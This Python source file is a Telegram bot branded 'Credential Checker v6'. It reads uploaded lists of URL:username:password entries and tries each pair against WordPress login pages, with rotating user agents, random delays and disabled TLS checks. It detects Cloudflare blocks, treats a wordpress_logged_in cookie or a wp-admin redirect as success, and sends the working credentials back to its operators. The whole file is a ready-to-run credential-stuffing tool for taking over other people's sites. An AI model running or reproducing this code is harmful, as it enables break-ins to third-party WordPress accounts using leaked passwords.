import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
import random
from datetime import datetime

# Fix for Pyrogram
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Config ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# --- Flask ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot running", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ FIXED PARSER ============

def parse_credential_line(line):
    """
    Parse: URL:USERNAME:PASSWORD
    Handles various URL formats correctly
    """
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    # Find where URL ends (first : after domain)
    # URL can be: domain.com, http://domain.com, https://domain.com
    
    # Pattern to match URL at start
    # Matches: domain.com/path, http://domain.com/path, https://domain.com/path
    url_pattern = r'^(https?://[^/]+|[^/:]+)(/[^:]*)?'
    match = re.match(url_pattern, line)
    
    if not match:
        return None
    
    url_part = match.group(0)
    remaining = line[len(url_part)+1:]  # +1 for the colon
    
    # Now split remaining by : to get username and password
    # Username might contain @ for emails
    parts = remaining.split(':')
    
    if len(parts) < 2:
        return None
    
    # Last part is always password
    password = parts[-1]
    # Everything between URL and password is username
    username = ':'.join(parts[:-1])
    
    # Clean URL
    url = clean_url(url_part)
    
    logger.info(f"PARSED: URL={url[:60]}, USER={username[:30]}, PASS={'*' * len(password)}")
    
    return (url, username, password)

def clean_url(url):
    """Clean and standardize URL"""
    url = url.strip().lower()
    
    # Remove duplicate protocols
    url = re.sub(r'^https://https://', 'https://', url)
    url = re.sub(r'^http://http://', 'http://', url)
    url = re.sub(r'^https://http://', 'http://', url)
    url = re.sub(r'^http://https://', 'https://', url)
    
    # Add protocol if missing
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # Convert specific paths to login URL
    if '/password/edit' in url:
        url = url.split('/password')[0] + '/login'
    elif '/sign_up' in url:
        url = url.split('/sign_up')[0] + '/login'
    elif '/login' not in url and not url.endswith('/'):
        url = url.rstrip('/') + '/login'
    
    return url

# ============ CHECKER ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

async def check_wordpress_login(session, url, username, password):
    """Check WordPress login"""
    
    # Ensure we have /login or /wp-login.php
    login_urls = [
        url if '/login' in url else url.rstrip('/') + '/login',
        url.replace('/login', '/wp-login.php') if '/login' in url else url.rstrip('/') + '/wp-login.php',
    ]
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': url.rsplit('/', 1)[0],
        'Referer': login_urls[0],
    }
    
    payload = {
        'log': username,
        'pwd': password,
        'rememberme': 'forever',
        'wp-submit': 'Log In',
        'redirect_to': url.rsplit('/', 1)[0] + '/wp-admin/',
        'testcookie': '1'
    }
    
    for login_url in login_urls:
        try:
            # Step 1: GET to get cookies
            async with session.get(login_url, headers=headers, timeout=15, ssl=False) as get_resp:
                get_text = await get_resp.text()
                
                # Check for Cloudflare
                if any(x in get_text for x in ['cf-browser-verification', 'Checking your browser', 'Just a moment']):
                    return (False, {'error': 'Cloudflare blocked', 'url': login_url})
                
                # Extract hidden fields
                hidden = {}
                for match in re.finditer(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', get_text):
                    if match.group(1) not in ['log', 'pwd', 'wp-submit']:
                        hidden[match.group(1)] = match.group(2)
                payload.update(hidden)
            
            await asyncio.sleep(random.uniform(1, 2))
            
            # Step 2: POST login
            async with session.post(
                login_url, data=payload, headers=headers,
                allow_redirects=True, timeout=20, ssl=False
            ) as resp:
                
                final_url = str(resp.url)
                text = await resp.text()
                status = resp.status
                
                # Get cookies
                cookies = {}
                for c in session.cookie_jar:
                    key = getattr(c, 'key', str(c))
                    cookies[key] = True
                
                debug = {
                    'url': login_url,
                    'status': status,
                    'final_url': final_url,
                    'cookies': list(cookies.keys())[:5],
                }
                
                # SUCCESS: WordPress logged_in cookie
                if any('wordpress_logged_in' in k for k in cookies):
                    return (True, {**debug, 'result': 'WP logged_in cookie'})
                
                # SUCCESS: Redirected to admin
                if '/wp-admin' in final_url and 'wp-login' not in final_url:
                    return (True, {**debug, 'result': 'Redirected to wp-admin'})
                
                # FAILURE checks
                text_lower = text.lower()
                failures = [
                    'incorrect password' in text_lower,
                    'invalid username' in text_lower,
                    'invalid email' in text_lower,
                    'unknown' in text_lower and 'email' in text_lower,
                    'login failed' in text_lower,
                    'error' in text_lower and 'login' in text_lower,
                    'class="shake"' in text_lower,
                    status == 403 and 'wp-login' in final_url,
                ]
                
                if any(failures):
                    return (False, {**debug, 'result': 'Login failed'})
                
                # Still on login page = fail
                if 'wp-login' in final_url or ('loginform' in text_lower and 'error' in text_lower):
                    return (False, {**debug, 'result': 'Still on login page'})
                
                return (False, {**debug, 'result': 'Unclear', 'snippet': text[:150]})
                
        except Exception as e:
            continue
    
    return (False, {'error': 'All login URLs failed'})

# ============ PROCESS ============

async def process_credentials(client, message, file_path):
    
    # Read
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error reading: {e}")
        return
    
    # Parse
    credentials = []
    for i, line in enumerate(lines, 1):
        parsed = parse_credential_line(line)
        if parsed:
            credentials.append((i, *parsed))
    
    total = len(credentials)
    if total == 0:
        await message.reply_text("❌ No valid credentials found")
        return
    
    await message.reply_text(f"🔍 Found {total} credentials. Starting check...")
    
    valid = []
    invalid = []
    checked = 0
    
    timeout = aiohttp.ClientTimeout(total=25)
    
    async with aiohttp.ClientSession(timeout=timeout) as session:
        
        for num, url, user, pwd in credentials:
            
            is_valid, debug = await check_wordpress_login(session, url, user, pwd)
            
            entry = f"{url}:{user}:{pwd}"
            
            if is_valid:
                valid.append(entry)
                logger.info(f"✅ VALID: {user}")
            else:
                invalid.append(f"{entry} | {str(debug)[:120]}")
                logger.info(f"❌ INVALID: {user} - {debug.get('result', 'unknown')}")
            
            checked += 1
            
            if checked % 3 == 0 or checked == total:
                await message.reply_text(
                    f"⏳ {checked}/{total} ({int(checked/total*100)}%)\n"
                    f"✅ Valid: {len(valid)} | ❌ Invalid: {len(invalid)}"
                )
            
            await asyncio.sleep(random.uniform(2, 3))
    
    # Results
    summary = f"✅ Done!\n\n📊 Total: {total}\n✅ Valid: {len(valid)}\n❌ Invalid: {len(invalid)}"
    await message.reply_text(summary)
    
    if valid:
        fname = f"VALID_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(valid))
        await message.reply_document(fname, caption=f"✅ {len(valid)} Valid Credentials")
        os.remove(fname)
    
    if invalid:
        fname = f"DEBUG_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(invalid[:20]))
        await message.reply_document(fname, caption="🐛 Debug Info")
        os.remove(fname)
    
    os.remove(file_path)

# ============ BOT ============

app = Client("checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start(client, message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text(
        "👨‍💻 **Credential Checker v6**\n\n"
        "✅ Fixed URL parsing\n"
        "✅ Handles all URL formats\n"
        "✅ WordPress optimized\n\n"
        "Send .txt file with format:\n"
        "`URL:username:password`"
    )

@app.on_message(filters.document)
async def doc(client, message):
    if not is_admin(message.from_user.id):
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Send .txt file only")
        return
    
    try:
        path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Download failed: {e}")
        return
    
    await message.reply_text("📥 File received. Processing...")
    await process_credentials(client, message, path)

@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
async def other(client, message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text("Send a .txt file")

# ============ RUN ============

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("Bot started")
    app.run()
